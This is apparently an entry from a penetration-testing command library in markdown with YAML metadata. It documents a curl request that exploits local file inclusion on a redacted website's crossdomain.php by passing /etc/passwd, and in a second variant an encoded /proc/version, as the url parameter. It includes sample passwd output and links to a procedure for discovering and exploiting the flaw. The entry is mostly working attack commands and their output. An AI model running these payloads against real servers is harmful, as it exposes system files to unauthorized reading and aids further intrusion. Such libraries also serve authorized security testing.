---
id: cmd-curl-lfi-test
data: 'curl "http://www.███████/crossdomain.php?url=/etc/passwd" -v'
tags:
  - lfi
  - testing
type: command
output: |-
  root:x:0:0:root:/root:/bin/bash
  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
  ...
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:53:38.694Z'
verified: false
validated: true
submitted: true
---
# curl-lfi-test

## Command

```bash
curl "http://www.███████/crossdomain.php?url=/etc/passwd" -v
```

## Description

This command tests for LFI by requesting a local file via the vulnerable URL parameter, using curl to send a GET request and verbose output for debugging.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `url` | Path to local file (e.g., /etc/passwd) | Yes |
| `-v` | Verbose mode for headers | No |

## Examples

### Basic Usage

```bash
curl "http://www.███████/crossdomain.php?url=/etc/passwd"
```

### Advanced Usage

```bash
curl "http://www.███████/crossdomain.php?url=%2Fproc%2Fversion" -H "User-Agent: Mozilla/5.0"
```

## Expected Output

File contents dumped to stdout, e.g., user account lines from /etc/passwd.

## Related

- [[Related Procedure|procedures/Discover-and-Exploit-LFI-in-URL-Parameter]]
